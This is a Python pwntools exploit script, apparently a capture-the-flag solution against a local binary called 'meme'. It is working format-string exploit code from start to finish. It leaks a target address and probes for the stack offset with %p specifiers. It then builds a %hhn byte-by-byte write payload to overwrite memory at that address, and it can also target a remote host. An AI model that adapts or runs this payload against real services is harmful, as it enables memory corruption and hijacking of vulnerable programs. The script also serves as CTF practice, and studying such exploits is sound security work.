from pwn import *

PROGRAM_PATH = (Path(__file__).parent / "meme").resolve().__str__()

gdb_script = """
b *main+191
b *main+236
c
"""

frame_size = 0x220
buff_size = 0x200


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    return process([PROGRAM_PATH] + argv, *a, **kwargs)


def probe_offset_new_process(limit=60):
    """Launch a throwaway process, leak offset, return (offset, target_addr)."""
    p = start()
    p.recvuntil(b"at ")
    tgt = int(p.recvline().strip(), 16)
    p.recvuntil(b": ")
    marker = b"A" * 8
    probe = marker + b"|" + b"|".join(f"%{i}$p".encode() for i in range(1, limit))
    p.sendline(probe)
    line = p.recv(timeout=1) or b""
    # read extra just in case
    line += p.recv(timeout=0.2) or b""
    decoded = line.decode(errors="ignore")
    print(f"[probe] {decoded.strip()}")
    parts = decoded.split("|")
    for idx, tok in enumerate(parts, 0):
        if "4141414141414141" in tok:
            if idx <= 0:
                continue
            p.close()
            print(f"[+] Offset discovered (separate proc) = {idx}")
            return idx, tgt
    p.close()
    print("[!] Offset not found in probe; returning (None, tgt)")
    return None, tgt


def align8(b: bytes) -> bytes:
    return b + (b"A" * ((-len(b)) % 8))


def build_byte_writes(target, data: bytes, first_idx: int):
    printed = 0
    parts = []
    for i, bval in enumerate(data):
        need = (bval - printed) & 0xFF
        if need:
            parts.append(f"%{need}c".encode())
            printed = (printed + need) & 0xFF
        parts.append(f"%{first_idx + i}$hhn".encode())
    fmt = align8(b"".join(parts))
    addrs = b"".join(p64(target + i) for i in range(len(data)))
    return fmt + addrs, fmt


phrase_bytes = b"2tRiViAl"
print(f"[+] Phrase full 8: {phrase_bytes}")

manual_off = getattr(args, "OFFSET", None)
offset = None
target = None

if manual_off:
    offset = int(manual_off)
    print(f"[+] Using manual OFFSET={offset}")
    # Need a fresh process to grab target
    io = start()
    io.recvuntil(b"at ")
    target = int(io.recvline().strip(), 16)
    io.recvuntil(b": ")
else:
    # Probe in separate process (option A)
    off, tgt = probe_offset_new_process()
    if off is None:
        print("[!] Probe failed; defaulting offset 8 (override with OFFSET=).")
        off = 8
    offset = off
    # Start exploitation process
    io = start()
    io.recvuntil(b"at ")
    target = int(io.recvline().strip(), 16)
    io.recvuntil(b": ")

print(f"[+] Target: {hex(target)}  | Offset: {offset}")

# Only write first 4 bytes "2tRi"
data4 = phrase_bytes[:4]  # b"2tRi"
payload, fmt_only = build_byte_writes(target, data4, offset)
print(f"[dbg] fmt length={len(fmt_only)} total payload={len(payload)} offset={offset}")

if args.VERIFY:
    verify_fmt = fmt_only.replace(b"hhn", b"p")
    verify_payload = verify_fmt + payload[len(fmt_only) :]
    print("[verify] sending verification payload")
    io.sendline(verify_payload)
    print(io.recvline(timeout=1))
    io.interactive()
    raise SystemExit

print("[send] sending exploit payload")
io.sendline(payload)
io.interactive()
